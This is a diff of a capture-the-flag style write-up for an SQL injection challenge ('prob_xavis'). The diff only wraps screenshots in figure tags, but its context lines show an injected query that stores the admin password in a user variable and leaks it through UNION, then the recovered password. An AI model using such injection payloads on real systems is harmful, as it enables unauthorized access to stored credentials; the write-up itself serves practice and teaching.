@@ -3,7 +3,9 @@ custom_edit_url: null
 sidebar_position: 19
 ---
 
+<figure style={{ textAlign: 'center' }}>
 ![1](https://github.com/Kunull/Write-ups/assets/110326359/fd332084-b8f3-4deb-ad35-fedd5d2021f5)
+</figure>
 
 We are provided with the SQL query:
 
@@ -36,7 +38,9 @@ The resultant query becomes:
 SELECT id FROM prob_xavis WHERE id='admin' AND pw='' or (SELECT @adminpassword:=pw WHERE id='admin') UNION SELECT @adminpassword -- -'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![2](https://github.com/Kunull/Write-ups/assets/110326359/6bad479f-f987-4106-bf7f-cd348902bf6c)
+</figure>
 
 As we can see, the password which was stored in the `adminpassword` variable has been leaked.
 
@@ -56,4 +60,6 @@ The resultant query becomes:
 SELECT id FROM prob_xavis WHERE id='admin' AND pw='우왕굳'
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![3](https://github.com/Kunull/Write-ups/assets/110326359/30da5ecc-5dec-4a67-9d19-509490f2753f)
+</figure>
